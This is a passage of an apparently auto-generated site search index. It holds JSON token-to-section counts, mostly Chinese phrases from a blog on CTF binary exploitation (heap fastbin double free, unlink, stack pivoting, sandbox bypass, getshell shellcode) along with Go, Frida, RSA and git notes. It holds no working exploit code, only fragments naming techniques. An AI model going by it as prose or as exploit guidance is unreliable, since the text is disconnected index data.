}],[\"+0xe3b2e\",{\"1\":{\"479\":1}}],[\"+0xf\",{\"1\":{\"289\":1,\"290\":1}}],[\"+2238824\",{\"1\":{\"479\":1}}],[\"+2240352+8\",{\"1\":{\"479\":1}}],[\"+2045376+0x28\",{\"1\":{\"479\":1}}],[\"+20\",{\"1\":{\"292\":1}}],[\"+libc\",{\"1\":{\"473\":1}}],[\"+pop\",{\"1\":{\"503\":9,\"504\":4}}],[\"+p32\",{\"1\":{\"471\":1,\"485\":1,\"486\":2}}],[\"+p64\",{\"1\":{\"378\":2,\"380\":6,\"473\":2,\"479\":2,\"481\":1,\"488\":6,\"491\":8,\"500\":2,\"502\":6,\"503\":14}}],[\"++n\",{\"1\":{\"460\":1}}],[\"++j\",{\"1\":{\"459\":1}}],[\"++i\",{\"1\":{\"459\":1,\"461\":1}}],[\"+fakechunk\",{\"1\":{\"377\":4,\"499\":4}}],[\"+fun\",{\"1\":{\"127\":1}}],[\"+1\",{\"1\":{\"358\":2,\"359\":2}}],[\"+12\",{\"1\":{\"292\":1}}],[\"+=asm\",{\"1\":{\"483\":2}}],[\"+=\",{\"1\":{\"324\":3,\"353\":1,\"358\":5,\"359\":5,\"460\":1,\"462\":1,\"483\":5,\"486\":5}}],[\"+glibc\",{\"1\":{\"307\":1}}],[\"+8\",{\"1\":{\"292\":1}}],[\"+this\",{\"1\":{\"125\":2}}],[\"+num\",{\"1\":{\"123\":1}}],[\"+\",{\"0\":{\"345\":1},\"1\":{\"42\":2,\"59\":1,\"127\":1,\"182\":2,\"199\":1,\"289\":1,\"290\":1,\"292\":8,\"296\":4,\"313\":1,\"324\":1,\"352\":1,\"353\":8,\"358\":1,\"359\":1,\"365\":1,\"367\":1,\"368\":1,\"369\":3,\"397\":16,\"438\":1,\"439\":2,\"441\":1,\"442\":1,\"459\":2,\"460\":3,\"461\":1,\"462\":9,\"475\":2,\"505\":4}}],[\"错误思路\",{\"0\":{\"302\":1}}],[\"错误指令异常等\",{\"1\":{\"20\":1,\"162\":1}}],[\"错了别打我\",{\"1\":{\"127\":1}}],[\"错开禁用号\",{\"1\":{\"42\":1,\"182\":1}}],[\"切换为32位\",{\"1\":{\"42\":1,\"182\":1}}],[\"切片实现\",{\"0\":{\"28\":1,\"170\":1}}],[\"切片会导致\",{\"1\":{\"23\":1,\"165\":1}}],[\"切片是引用类型\",{\"1\":{\"23\":1,\"165\":1}}],[\"此指针只有内存未分配时用到\",{\"1\":{\"438\":1}}],[\"此pr修复了什么\",{\"1\":{\"270\":1}}],[\"此函数以其首名研究者欧拉命名\",{\"1\":{\"240\":1}}],[\"此时chunk\",{\"1\":{\"491\":1}}],[\"此时fastbin有三个\",{\"1\":{\"491\":1}}],[\"此时index为6的获取了\",{\"1\":{\"491\":1}}],[\"此时index为5\",{\"1\":{\"377\":1,\"499\":1}}],[\"此时我们rsp\",{\"1\":{\"446\":1}}],[\"此时我们成功完成构造\",{\"1\":{\"368\":1}}],[\"此时函数并未真正在执行\",{\"1\":{\"281\":1}}],[\"此时与其它文件系统相同\",{\"1\":{\"73\":1,\"213\":1}}],[\"此时这个时候这个目录下就已经有了我们的文件目录\",{\"1\":{\"73\":1,\"213\":1}}],[\"此过程不可逆\",{\"1\":{\"41\":1,\"181\":1}}],[\"此作法主要的优点是如果调用者没有修改该资源\",{\"1\":{\"8\":1,\"150\":1}}],[\"起到了过滤作用\",{\"1\":{\"41\":1,\"181\":1}}],[\"的合并机制需要\",{\"1\":{\"491\":1}}],[\"的值可以改变\",{\"1\":{\"466\":1}}],[\"的工作原理\",{\"0\":{\"466\":1}}],[\"的前\",{\"1\":{\"464\":2}}],[\"的搜索是区分大小写的\",{\"1\":{\"464\":1}}],[\"的翻译\",{\"1\":{\"452\":1}}],[\"的参数给\",{\"1\":{\"449\":1}}],[\"的地方\",{\"1\":{\"449\":1}}],[\"的fd不能像修改fd\",{\"1\":{\"367\":1}}],[\"的fd和bk分别指向chunk\",{\"1\":{\"365\":1}}],[\"的位置\",{\"1\":{\"357\":1}}],[\"的chunk指针\",{\"1\":{\"491\":1}}],[\"的chunk\",{\"1\":{\"347\":1,\"358\":2,\"359\":2,\"475\":2,\"491\":2,\"503\":2}}],[\"的部分清空\",{\"1\":{\"324\":1}}],[\"的头部指针的值赋给块\",{\"1\":{\"324\":1}}],[\"的链表表头赋值给\",{\"1\":{\"318\":1}}],[\"的指针\",{\"1\":{\"312\":1}}],[\"的下一个chunk\",{\"1\":{\"312\":1}}],[\"的倍数\",{\"1\":{\"289\":1}}],[\"的历史记录中删除提交通常是一个坏主意\",{\"1\":{\"273\":1}}],[\"的错误响应\",{\"1\":{\"254\":1}}],[\"的错误响应函数\",{\"1\":{\"254\":1}}],[\"的\",{\"1\":{\"252\":1,\"284\":1,\"324\":1,\"435\":1}}],[\"的内容为\",{\"1\":{\"449\":1}}],[\"的内容\",{\"1\":{\"252\":1}}],[\"的模反元素d\",{\"1\":{\"240\":1}}],[\"的时候\",{\"1\":{\"347\":1}}],[\"的时候相当于会自动去调用函数\",{\"1\":{\"124\":1}}],[\"的时候会初始化tty\",{\"1\":{\"79\":1,\"219\":1}}],[\"的方式来hook\",{\"1\":{\"121\":1}}],[\"的几率\",{\"1\":{\"69\":1,\"209\":1}}],[\"的入链机制\",{\"1\":{\"57\":1,\"197\":1}}],[\"的意思是请求回写\",{\"1\":{\"47\":1,\"187\":1}}],[\"的第二个参数\",{\"1\":{\"47\":1,\"187\":1}}],[\"的第一个参数\",{\"1\":{\"47\":1,\"187\":1}}],[\"的基础上提供了现有功能的超集\",{\"1\":{\"41\":1,\"181\":1}}],[\"的一切\",{\"1\":{\"16\":1,\"158\":1}}],[\"过滤模式\",{\"1\":{\"41\":1,\"181\":1}}],[\"增加了新的模式\",{\"1\":{\"41\":1,\"181\":1}}],[\"调整attached\",{\"1\":{\"353\":1}}],[\"调整进程被\",{\"1\":{\"69\":1,\"209\":1}}],[\"调试源码\",{\"0\":{\"404\":1}}],[\"调试技巧\",{\"0\":{\"297\":1}}],[\"调试起来是困难的\",{\"1\":{\"246\":1}}],[\"调试\",{\"0\":{\"73\":1,\"213\":1,\"311\":1,\"408\":1,\"411\":1,\"414\":1,\"417\":1,\"420\":1,\"440\":1}}],[\"调度的单位\",{\"1\":{\"66\":1,\"206\":1}}],[\"调用read在bss段部署payload\",{\"1\":{\"505\":1}}],[\"调用号\",{\"1\":{\"483\":1}}],[\"调用scanf后\",{\"1\":{\"431\":1}}],[\"调用open函数\",{\"1\":{\"483\":1}}],[\"调用openat\",{\"1\":{\"40\":1,\"180\":1}}],[\"调用overflow\",{\"1\":{\"387\":1}}],[\"调用主要是\",{\"1\":{\"351\":1}}],[\"调用链\",{\"0\":{\"350\":1}}],[\"调用了的函数\",{\"1\":{\"134\":1}}],[\"调用构造函数\",{\"1\":{\"124\":1}}],[\"调用原函数\",{\"1\":{\"124\":1}}],[\"调用原本的函数\",{\"0\":{\"122\":1}}],[\"调用原来的函数\",{\"1\":{\"121\":1,\"123\":1}}],[\"调用者把参数都保存在a0\",{\"1\":{\"49\":1,\"189\":1}}],[\"调用\",{\"0\":{\"387\":1},\"1\":{\"47\":1,\"187\":1,\"387\":1,\"449\":1}}],[\"调入物理内存页\",{\"1\":{\"16\":1,\"158\":1}}],[\"来看看运行的顺序\",{\"1\":{\"461\":1}}],[\"来看看对应函数运行的时候n的值\",{\"1\":{\"461\":1}}],[\"来获取名字了\",{\"1\":{\"451\":1}}],[\"来解析符号地址\",{\"1\":{\"449\":1}}],[\"来到了\",{\"1\":{\"446\":1}}],[\"来绕过fastbin中检查double\",{\"1\":{\"378\":1,\"500\":1}}],[\"来让scanf\",{\"1\":{\"376\":1,\"498\":1}}],[\"来让原本的头chunk之间相互合并\",{\"1\":{\"374\":1,\"496\":1}}],[\"来触发合并\",{\"1\":{\"376\":1,\"498\":1}}],[\"来触发调用链\",{\"1\":{\"59\":1,\"199\":1}}],[\"来申请0x90大小的chunk\",{\"1\":{\"372\":1,\"494\":1}}],[\"来构建高性能\",{\"1\":{\"277\":1}}],[\"来确定连接是否存在\",{\"1\":{\"255\":1}}],[\"来确定默认首先进入的activity\",{\"1\":{\"143\":1}}],[\"来实现栈迁移返回到存放backdoor的栈地址上\",{\"1\":{\"480\":1}}],[\"来实现任意地址的free\",{\"1\":{\"372\":1,\"494\":1}}],[\"来实现一个fake\",{\"1\":{\"345\":1}}],[\"来实现简化这个过程\",{\"1\":{\"250\":1}}],[\"来实现函数的调用\",{\"1\":{\"79\":1,\"219\":1}}],[\"来分配内存页\",{\"1\":{\"70\":1,\"210\":1}}],[\"来配置的\",{\"1\":{\"69\":1,\"209\":1}}],[\"来间接访问内存\",{\"1\":{\"65\":1,\"205\":1}}],[\"来读取flag\",{\"1\":{\"40\":1,\"180\":1}}],[\"来个比喻\",{\"1\":{\"14\":1,\"156\":1}}],[\"沙箱绕过\",{\"1\":{\"40\":2,\"180\":2}}],[\"板子\",{\"1\":{\"40\":1,\"180\":1}}],[\"现在提取flag数据进行解密\",{\"1\":{\"462\":1}}],[\"现在在栈顶\",{\"1\":{\"449\":1}}],[\"现在仔细了解一下顺便把udp\",{\"1\":{\"432\":1}}],[\"现在攻击者将不需要得到leak\",{\"1\":{\"38\":1,\"178\":1}}],[\"现在一个int变量存放在从地址1开始的联系四个字节地址中\",{\"1\":{\"12\":1,\"154\":1}}],[\"欢迎回来\",{\"1\":{\"38\":1,\"178\":1}}],[\"´∇｀\",{\"1\":{\"38\":1,\"178\":1}}],[\"参考强网杯的shellcode第五届强网杯\",{\"1\":{\"483\":1}}],[\"参考文章android之frida框架完全使用指南\",{\"1\":{\"113\":1}}],[\"参考文章\",{\"0\":{\"382\":1},\"1\":{\"38\":1,\"44\":1,\"52\":1,\"143\":1,\"178\":1,\"184\":1,\"192\":1,\"240\":1,\"244\":1,\"246\":1,\"252\":1,\"253\":1,\"263\":1,\"307\":1,\"346\":1,\"432\":1,\"437\":1,\"450\":1}}],[\"参数\",{\"1\":{\"458\":1}}],[\"参数传递\",{\"1\":{\"32\":1,\"174\":1}}],[\"参加贡献的方式\",{\"0\":{\"111\":1}}],[\"ez2\",{\"0\":{\"486\":1}}],[\"ez1\",{\"0\":{\"485\":1}}],[\"ezchunk\",{\"0\":{\"291\":1}}],[\"esi\",{\"1\":{\"483\":1}}],[\"esp\",{\"1\":{\"446\":2,\"483\":5}}],[\"ecx\",{\"1\":{\"483\":4}}],[\"echomessage\",{\"1\":{\"254\":1}}],[\"echo\",{\"1\":{\"254\":1,\"463\":1,\"467\":1}}],[\"eof\",{\"1\":{\"464\":1}}],[\"eax\",{\"1\":{\"461\":1,\"483\":5}}],[\"each\",{\"1\":{\"286\":2,\"324\":2}}],[\"etc\",{\"1\":{\"453\":1}}],[\"eip存入我们的read\",{\"1\":{\"446\":1}}],[\"eip\",{\"1\":{\"446\":2,\"483\":1}}],[\"equal\",{\"1\":{\"352\":1}}],[\"even\",{\"1\":{\"324\":1}}],[\"event\",{\"1\":{\"279\":8}}],[\"events\",{\"1\":{\"279\":12}}],[\"eventloop\",{\"0\":{\"279\":1},\"1\":{\"278\":1,\"279\":1}}],[\"elegy\",{\"1\":{\"473\":2}}],[\"elf\",{\"1\":{\"369\":4,\"451\":6,\"473\":2,\"475\":2,\"479\":2,\"480\":2,\"481\":2,\"482\":2,\"483\":2,\"484\":2,\"485\":2,\"486\":3,\"488\":2,\"491\":2,\"503\":2,\"504\":2,\"505\":2}}],[\"elixir\",{\"1\":{\"331\":1}}],[\"eligible\",{\"1\":{\"324\":1}}],[\"else\",{\"1\":{\"242\":1,\"243\":1,\"255\":1,\"321\":1,\"324\":6,\"344\":2,\"351\":1,\"352\":3,\"353\":1,\"369\":1,\"410\":1,\"439\":1,\"441\":1,\"469\":1,\"503\":1}}],[\"empty\",{\"1\":{\"321\":1,\"358\":1}}],[\"emo\",{\"1\":{\"292\":1,\"293\":3}}],[\"errout\",{\"1\":{\"339\":3}}],[\"error\",{\"0\":{\"261\":1},\"1\":{\"131\":1,\"254\":4,\"258\":3}}],[\"errstr\",{\"1\":{\"339\":3}}],[\"err\",{\"1\":{\"254\":4,\"255\":3,\"261\":5}}],[\"e求d\",{\"1\":{\"243\":2}}],[\"e推到出d吗\",{\"1\":{\"241\":1}}],[\"edit\",{\"1\":{\"488\":5}}],[\"editemo的时候是根据判断emo\",{\"1\":{\"293\":1}}],[\"edi\",{\"1\":{\"483\":1}}],[\"edx\",{\"1\":{\"483\":5}}],[\"ed=1\",{\"1\":{\"243\":1}}],[\"ed=1mod\",{\"1\":{\"241\":1}}],[\"ed\",{\"1\":{\"240\":3}}],[\"e\",{\"1\":{\"240\":3,\"241\":1,\"243\":4,\"324\":2,\"339\":1,\"342\":4,\"464\":1,\"475\":1}}],[\"ebx\",{\"1\":{\"483\":3}}],[\"ebp的\",{\"1\":{\"446\":1}}],[\"ebp的地方\",{\"1\":{\"446\":1}}],[\"ebp的地址上\",{\"1\":{\"445\":1}}],[\"ebp2的地址给了rbp\",{\"1\":{\"446\":1}}],[\"ebp1\",{\"1\":{\"446\":1}}],[\"ebp寄存器\",{\"1\":{\"446\":1}}],[\"ebp\",{\"1\":{\"445\":1,\"446\":4,\"483\":1}}],[\"ebnf语法\",{\"1\":{\"89\":1,\"229\":1}}],[\"eb\",{\"1\":{\"70\":1,\"210\":1}}],[\"enabled\",{\"1\":{\"469\":1}}],[\"enablecompression\",{\"1\":{\"254\":2}}],[\"enough\",{\"1\":{\"352\":1}}],[\"endian=\",{\"1\":{\"475\":1,\"484\":1,\"485\":1,\"486\":1,\"488\":1}}],[\"endif\",{\"1\":{\"324\":3,\"389\":1,\"403\":2,\"407\":1,\"438\":1,\"439\":3,\"441\":1,\"442\":2}}],[\"end被赋值\",{\"1\":{\"431\":1}}],[\"end\",{\"1\":{\"324\":2,\"390\":8,\"408\":16,\"410\":4,\"430\":1,\"438\":1,\"483\":4}}],[\"entries\",{\"1\":{\"286\":2}}],[\"entry\",{\"1\":{\"286\":4,\"321\":1,\"324\":1,\"339\":1,\"342\":3}}],[\"entry代表着当前bin的首个chunk\",{\"1\":{\"286\":1}}],[\"enter\",{\"1\":{\"43\":2,\"127\":1,\"183\":2,\"369\":2,\"488\":1,\"491\":4,\"503\":5}}],[\"env\",{\"1\":{\"262\":1,\"459\":1,\"461\":1}}],[\"envp\",{\"1\":{\"37\":1,\"177\":1,\"470\":2}}],[\"engine\",{\"1\":{\"258\":4}}],[\"encode\",{\"1\":{\"358\":3,\"359\":3,\"475\":5,\"479\":1,\"480\":1,\"484\":4,\"488\":5,\"491\":4,\"503\":5}}],[\"enc\",{\"1\":{\"243\":1}}],[\"enumerateclassloaderssync\",{\"1\":{\"126\":1}}],[\"enumerateloadedclasses\",{\"1\":{\"126\":1,\"131\":1}}],[\"except\",{\"1\":{\"491\":1,\"503\":1}}],[\"exception\",{\"1\":{\"280\":2}}],[\"exceeds\",{\"1\":{\"324\":1}}],[\"exchange\",{\"1\":{\"324\":1,\"339\":1,\"352\":1}}],[\"exclude\",{\"1\":{\"324\":1}}],[\"exhaust\",{\"1\":{\"321\":1}}],[\"exhausted\",{\"1\":{\"258\":1}}],[\"expected\",{\"1\":{\"428\":1,\"439\":1,\"441\":1}}],[\"expect\",{\"1\":{\"296\":2,\"324\":10,\"339\":4,\"344\":1,\"345\":1,\"378\":1,\"500\":1}}],[\"explore\",{\"1\":{\"133\":1}}],[\"ext\",{\"1\":{\"242\":2,\"243\":3}}],[\"extras\",{\"1\":{\"140\":1,\"143\":1}}],[\"extracted\",{\"1\":{\"73\":2,\"213\":2}}],[\"extract\",{\"1\":{\"73\":1,\"213\":1}}],[\"ext4\",{\"1\":{\"73\":1,\"213\":1}}],[\"ext4和cpio\",{\"1\":{\"73\":1,\"213\":1}}],[\"exit调用\",{\"1\":{\"384\":1}}],[\"exited\",{\"1\":{\"258\":2}}],[\"exit\",{\"0\":{\"477\":1},\"1\":{\"41\":1,\"131\":2,\"181\":1,\"372\":4,\"380\":4,\"397\":1,\"423\":1,\"460\":1,\"463\":1,\"479\":7,\"494\":4,\"502\":4}}],[\"example\",{\"1\":{\"40\":1,\"121\":1,\"123\":2,\"124\":1,\"125\":2,\"126\":2,\"180\":1}}],[\"execution\",{\"1\":{\"74\":1,\"214\":1}}],[\"execve\",{\"0\":{\"67\":1,\"207\":1}}],[\"exec\",{\"1\":{\"42\":1,\"182\":1,\"258\":1}}],[\"exec并不会导致pid的改变\",{\"1\":{\"16\":1,\"158\":1}}],[\"exe\",{\"1\":{\"37\":1,\"177\":1}}],[\"字段\",{\"1\":{\"324\":1}}],[\"字段名和函数名相同需要加下划线\",{\"1\":{\"125\":1}}],[\"字面量语法树\",{\"0\":{\"91\":1,\"231\":1}}],[\"字节不够情况下\",{\"1\":{\"42\":1,\"182\":1}}],[\"字符串数组指针\",{\"1\":{\"37\":1,\"177\":1}}],[\"字典实现\",{\"0\":{\"25\":1,\"167\":1}}],[\"提取vatble\",{\"1\":{\"387\":1}}],[\"提取elf\",{\"1\":{\"36\":1,\"176\":1}}],[\"提交pr的规范\",{\"0\":{\"270\":1}}],[\"提交信息格式\",{\"0\":{\"264\":1},\"1\":{\"263\":1}}],[\"提交频率\",{\"1\":{\"263\":1}}],[\"提交这些操作到\",{\"1\":{\"43\":1,\"183\":1}}],[\"提交io事件并且等待其完成\",{\"1\":{\"43\":1,\"183\":1}}],[\"提交请求\",{\"1\":{\"43\":1,\"183\":1}}],[\"提供输入的发送进程\",{\"1\":{\"13\":1,\"155\":1}}],[\"先是取回所有的tcache\",{\"1\":{\"491\":1}}],[\"先是get我们的输入\",{\"1\":{\"460\":1}}],[\"先开始想复杂了\",{\"1\":{\"483\":1}}],[\"先大概把类型改改\",{\"1\":{\"459\":1}}],[\"先创建一个file结构体\",{\"1\":{\"401\":1}}],[\"先调用arena\",{\"1\":{\"350\":1}}],[\"先获取我们真正需要的\",{\"1\":{\"336\":1}}],[\"先malloc\",{\"1\":{\"302\":1,\"358\":1}}],[\"先学习unlink漏洞\",{\"0\":{\"295\":1}}],[\"先熟悉下几个术语\",{\"1\":{\"238\":1}}],[\"先知社区\",{\"1\":{\"73\":1,\"74\":1,\"213\":1,\"214\":1}}],[\"先弹出栈顶给ip然后弹出给cs寄存器\",{\"1\":{\"44\":1,\"184\":1}}],[\"先执行跳转到got\",{\"1\":{\"36\":1,\"176\":1}}],[\"先压入返回地址\",{\"1\":{\"29\":1,\"171\":1}}],[\"赋值给变量\",{\"1\":{\"32\":1,\"174\":1}}],[\"从路径\",{\"1\":{\"453\":1}}],[\"从空闲链表中获取一个分配区\",{\"1\":{\"352\":1}}],[\"从0x20到0x410\",{\"1\":{\"338\":1}}],[\"从libc2\",{\"1\":{\"338\":1}}],[\"从largebin中获取chunk\",{\"0\":{\"320\":1}}],[\"从glibc2\",{\"1\":{\"330\":1}}],[\"从shared\",{\"1\":{\"327\":1}}],[\"从heap下方的data段\",{\"1\":{\"327\":1}}],[\"从thread\",{\"1\":{\"351\":1}}],[\"从topchunk中获取chunk\",{\"0\":{\"323\":1}}],[\"从tls到pthread\",{\"1\":{\"38\":1,\"178\":1}}],[\"从tls中减去一个特定的常量值\",{\"1\":{\"38\":1,\"178\":1}}],[\"从unsortedbin中移除\",{\"0\":{\"314\":1}}],[\"从unsorted\",{\"1\":{\"310\":1}}],[\"从\",{\"1\":{\"273\":1,\"453\":2}}],[\"从状态机的角度async和await的实现原理\",{\"1\":{\"103\":1}}],[\"从状态机角度分析\",{\"1\":{\"103\":1}}],[\"从汇编角度看retn和retf\",{\"1\":{\"44\":1,\"184\":1}}],[\"从cq中取出结果进行后续处理\",{\"1\":{\"43\":1,\"183\":1}}],[\"从而来泄露出key值\",{\"1\":{\"378\":1,\"500\":1}}],[\"从而实现double\",{\"1\":{\"372\":1,\"494\":1}}],[\"从而实现数据变化b和c都发生变化\",{\"1\":{\"250\":1}}],[\"从而让它适配新的功能\",{\"1\":{\"252\":1}}],[\"从而bypass\",{\"1\":{\"38\":1,\"178\":1}}],[\"从而伪造r\",{\"1\":{\"36\":1,\"176\":1}}],[\"从函数返回和赋值给变量\",{\"1\":{\"32\":1,\"174\":1}}],[\"从上述管道读写操作可知\",{\"1\":{\"13\":1,\"155\":1}}],[\"从上述的分析来看\",{\"1\":{\"13\":1,\"155\":1}}],[\"腾讯云\",{\"1\":{\"32\":1,\"174\":1,\"295\":1,\"432\":1}}],[\"腾讯云开发者社区\",{\"1\":{\"32\":1,\"174\":1,\"295\":1,\"432\":1}}],[\"探索go语言中的函数一等公民\",{\"1\":{\"32\":1,\"174\":1}}],[\"高版本的overlapping\",{\"0\":{\"361\":1}}],[\"高版本已经删除\",{\"1\":{\"60\":1,\"200\":1}}],[\"高端内存也就是896mb之上的区域\",{\"1\":{\"70\":1,\"210\":1}}],[\"高阶函数编程\",{\"1\":{\"32\":1,\"174\":1}}],[\"高层页表的页表项并不保存物理页号\",{\"1\":{\"10\":1,\"152\":1}}],[\"闭包\",{\"0\":{\"31\":1,\"173\":1}}],[\"33168\",{\"1\":{\"504\":1}}],[\"33\",{\"1\":{\"462\":1}}],[\"3ch\",{\"1\":{\"459\":1}}],[\"35版本下有fd加密\",{\"1\":{\"491\":1}}],[\"35494\",{\"1\":{\"481\":1}}],[\"35\",{\"1\":{\"376\":1,\"382\":1,\"498\":1}}],[\"35下存在fd加密机制\",{\"1\":{\"378\":1,\"500\":1}}],[\"35下对tls\",{\"1\":{\"372\":1,\"494\":1}}],[\"35下的exit函数打法\",{\"0\":{\"370\":1,\"492\":1}}],[\"3个chunk\",{\"1\":{\"365\":1}}],[\"34019\",{\"1\":{\"480\":1}}],[\"34以上我们没办法使用常规的overlapping\",{\"1\":{\"361\":1}}],[\"34下的合并检查机制\",{\"1\":{\"362\":1}}],[\"34下\",{\"1\":{\"303\":1}}],[\"34\",{\"0\":{\"299\":1},\"1\":{\"300\":1,\"470\":1}}],[\"36\",{\"1\":{\"292\":1}}],[\"38\",{\"1\":{\"261\":1,\"432\":1}}],[\"38456719616722997\",{\"1\":{\"243\":1}}],[\"37\",{\"1\":{\"261\":1}}],[\"3db8720ecbf5\",{\"1\":{\"258\":2}}],[\"31m\",{\"1\":{\"397\":1}}],[\"31里面引用了key检查\",{\"1\":{\"342\":1}}],[\"31\",{\"1\":{\"257\":1,\"307\":1,\"460\":1,\"461\":1,\"462\":1,\"480\":1}}],[\"3a42\",{\"1\":{\"255\":1}}],[\"3a09\",{\"1\":{\"255\":1}}],[\"3a\",{\"1\":{\"255\":2,\"263\":1}}],[\"30h\",{\"1\":{\"459\":1,\"469\":1}}],[\"30\",{\"1\":{\"255\":1,\"461\":1,\"488\":2}}],[\"301082\",{\"1\":{\"134\":8}}],[\"3072\",{\"1\":{\"50\":1,\"190\":1}}],[\"32t的vmalloc区域\",{\"1\":{\"70\":1,\"210\":1}}],[\"32\",{\"1\":{\"50\":1,\"190\":1,\"358\":1,\"359\":1,\"461\":4,\"462\":1,\"479\":1,\"480\":1}}],[\"32位是2\",{\"1\":{\"352\":1}}],[\"32位是4g\",{\"1\":{\"70\":1,\"210\":1}}],[\"32位内核内存分布\",{\"1\":{\"70\":1,\"210\":1}}],[\"32位操作系统和64位操作系统在内核内存的分布是不一样的\",{\"1\":{\"70\":1,\"210\":1}}],[\"32位我们比较熟悉\",{\"1\":{\"63\":1,\"203\":1}}],[\"32位\",{\"1\":{\"44\":1,\"47\":1,\"184\":1,\"187\":1,\"357\":1}}],[\"3一啊不能用作函数的参数传递和返回值使用\",{\"1\":{\"47\":1,\"187\":1}}],[\"3\",{\"1\":{\"30\":4,\"36\":2,\"41\":2,\"50\":2,\"68\":1,\"172\":4,\"176\":2,\"181\":2,\"190\":2,\"208\":1,\"244\":1,\"252\":1,\"258\":2,\"261\":1,\"262\":2,\"281\":3,\"347\":1,\"358\":1,\"359\":1,\"365\":3,\"366\":1,\"367\":2,\"368\":2,\"369\":8,\"373\":1,\"397\":1,\"404\":1,\"432\":1,\"438\":2,\"449\":2,\"454\":1,\"459\":2,\"461\":10,\"462\":1,\"464\":1,\"475\":1,\"479\":1,\"483\":2,\"484\":1,\"488\":2,\"491\":1,\"495\":1,\"503\":2}}],[\"=35002\",{\"1\":{\"483\":1}}],[\"=base\",{\"1\":{\"503\":1}}],[\"=b\",{\"1\":{\"479\":2,\"504\":1,\"505\":1}}],[\"=>\",{\"1\":{\"456\":1}}],[\"=system\",{\"1\":{\"404\":1}}],[\"=1求解\",{\"1\":{\"240\":1}}],[\"==>之前\",{\"1\":{\"456\":1}}],[\"==\",{\"1\":{\"240\":1,\"242\":1,\"243\":1,\"296\":4,\"313\":2,\"321\":1,\"324\":5,\"339\":2,\"342\":2,\"344\":2,\"345\":2,\"352\":3,\"353\":2,\"378\":1,\"403\":1,\"417\":1,\"426\":2,\"469\":1,\"500\":1}}],[\"=function\",{\"1\":{\"121\":1,\"122\":1}}],[\"=\",{\"1\":{\"30\":6,\"121\":1,\"123\":1,\"124\":2,\"125\":4,\"126\":2,\"131\":4,\"172\":6,\"240\":6,\"241\":1,\"242\":4,\"243\":7,\"254\":6,\"255\":2,\"261\":1,\"279\":4,\"281\":4,\"286\":1,\"290\":5,\"296\":13,\"305\":10,\"306\":1,\"310\":4,\"312\":7,\"313\":11,\"314\":2,\"315\":2,\"317\":4,\"318\":5,\"319\":23,\"321\":20,\"322\":1,\"324\":36,\"325\":13,\"339\":19,\"342\":5,\"344\":20,\"345\":8,\"349\":2,\"351\":4,\"352\":9,\"353\":21,\"358\":16,\"359\":16,\"369\":18,\"373\":3,\"377\":6,\"378\":3,\"380\":5,\"395\":3,\"397\":14,\"403\":4,\"407\":1,\"408\":90,\"410\":16,\"411\":2,\"413\":1,\"417\":4,\"419\":1,\"428\":3,\"439\":13,\"441\":7,\"442\":6,\"446\":1,\"451\":6,\"459\":3,\"461\":2,\"462\":6,\"463\":4,\"469\":1,\"470\":2,\"471\":3,\"473\":31,\"475\":24,\"479\":28,\"480\":19,\"481\":20,\"482\":22,\"483\":23,\"484\":19,\"485\":8,\"486\":21,\"488\":24,\"491\":32,\"495\":3,\"499\":6,\"500\":3,\"502\":5,\"503\":48,\"504\":26,\"505\":28}}],[\"深度长文\",{\"1\":{\"244\":1}}],[\"深copy是复制对象的值\",{\"1\":{\"30\":1,\"172\":1}}],[\"深\",{\"0\":{\"30\":1,\"172\":1}}],[\"深入窥探动态链接\",{\"1\":{\"449\":1}}],[\"深入理解\",{\"0\":{\"404\":1},\"1\":{\"450\":1}}],[\"深入理解计算机系统\",{\"1\":{\"3\":1,\"146\":1}}],[\"深入学习堆结构\",{\"0\":{\"326\":1}}],[\"深入解析go\",{\"1\":{\"22\":1,\"164\":1}}],[\"数值\",{\"1\":{\"464\":4}}],[\"数组主要是结构体中存储了长度\",{\"1\":{\"27\":1,\"169\":1}}],[\"数组实现\",{\"0\":{\"27\":1,\"169\":1}}],[\"数据库\",{\"0\":{\"102\":1}}],[\"数据库也采用了该策略\",{\"1\":{\"9\":1,\"151\":1}}],[\"数据可以任意存放\",{\"1\":{\"12\":1,\"154\":1}}],[\"数据存储的写时复制\",{\"1\":{\"9\":1,\"151\":1}}],[\"则自动退出\",{\"1\":{\"464\":1}}],[\"则使用默认属性创建线程\",{\"1\":{\"458\":1}}],[\"则使用安全默认值\",{\"1\":{\"254\":1}}],[\"则thread\",{\"1\":{\"351\":1}}],[\"则从unsorted\",{\"1\":{\"330\":1}}],[\"则从tcachebin\",{\"1\":{\"330\":1}}],[\"则从堆栈中取出返回地址\",{\"1\":{\"49\":1,\"189\":1}}],[\"则继续进行合并\",{\"1\":{\"324\":1}}],[\"则也设置为空闲\",{\"1\":{\"324\":1}}],[\"则将fd\",{\"1\":{\"321\":1}}],[\"则直接使用\",{\"1\":{\"352\":1}}],[\"则直接返回chunk\",{\"1\":{\"315\":1}}],[\"则直接在桶后面添加这个value\",{\"1\":{\"25\":1,\"167\":1}}],[\"则报错double\",{\"1\":{\"324\":1}}],[\"则报错\",{\"1\":{\"312\":2}}],[\"则连接仍然存在\",{\"1\":{\"255\":1}}],[\"则返回false\",{\"1\":{\"254\":1}}],[\"则返回a的i地址存储再ra寄存器中\",{\"1\":{\"49\":1,\"189\":1}}],[\"则服务会从第一个开始匹配客户端的协议\",{\"1\":{\"254\":1}}],[\"则称它们为互质\",{\"1\":{\"240\":1}}],[\"则\",{\"1\":{\"239\":1,\"254\":1,\"321\":1}}],[\"则可以进行栈迁移\",{\"1\":{\"59\":1,\"199\":1}}],[\"则对所有的用户都起作用\",{\"1\":{\"41\":1,\"181\":1}}],[\"则是a的指针被传递过去\",{\"1\":{\"24\":1,\"166\":1}}],[\"则进程休眠让出\",{\"1\":{\"13\":1,\"155\":1}}],[\"则进程往缓冲区中写\",{\"1\":{\"13\":1,\"155\":1}}],[\"协程不是被操作系统内核所管理\",{\"1\":{\"23\":1,\"165\":1}}],[\"协程\",{\"1\":{\"23\":1,\"165\":1}}],[\"那么\",{\"1\":{\"446\":1}}],[\"那么同理\",{\"1\":{\"446\":1}}],[\"那么下面是实现原理图\",{\"1\":{\"446\":1}}],[\"那么这个指令的本质\",{\"1\":{\"446\":1}}],[\"那么这个格式化字符串就相当于\",{\"1\":{\"39\":1,\"179\":1}}],[\"那么最终就会在目标地址0x0到0x30处覆盖上我们的0xf0偏移处的数据\",{\"1\":{\"388\":1}}],[\"那么后面我们就要想办法让chunk\",{\"1\":{\"365\":1}}],[\"那么fd\",{\"1\":{\"345\":1}}],[\"那么fork之前执行的栈堆代码段等的拷贝就是白用工\",{\"1\":{\"16\":1,\"158\":1}}],[\"那么我们字符串后面填上getshell的shellcode即可\",{\"1\":{\"482\":1}}],[\"那么我们就知道了\",{\